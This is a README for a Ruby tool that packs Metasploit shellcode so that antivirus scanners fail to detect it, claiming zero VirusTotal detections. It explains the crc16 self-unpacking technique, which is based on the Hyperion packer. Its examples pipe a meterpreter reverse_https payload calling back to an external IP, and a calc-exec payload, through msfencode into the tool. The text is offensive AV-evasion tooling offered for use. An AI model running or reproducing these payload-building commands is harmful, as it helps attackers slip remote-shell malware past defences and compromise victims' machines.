msfundetect
===========

Msfundetect is a ruby script that undetects payloads and it can be used smoothly with msfpayload for getting 0/54 detections in virustotal.

usage: msfundetect <payload>

explanation:
Msfundetect is based in "hyperion" packer (by Ammann, 2012, http://nullsecurity.net/papers/nullsec-pe-crypter.pdf).
Instead of using hyperion's original approach of bruteforcing an AES key in order to decrypt the payload, msfundetect bruteforces the entire payload using an optimized crc16, which generates a self unpacking shellcode containing the crc16 hashing function and the crc16 hashed payload.

advantages:
Msfundetect generates undetectable standalone shellcode (which may be used in buffer-overflow, use-after-free attacks).
It also has the option to make an executable, which is also undetectable.





examples:

msfpayload windows/meterpreter/reverse_https lhost=55.55.55.55 lport=55 r | msfencode -e x86/alphamixed bufferregister=eax -t raw | msfundetect x

msfpayload windows/exec cmd=calc r | msfencode -e x86/alphamixed bufferregister=eax -t raw | msfundetect c
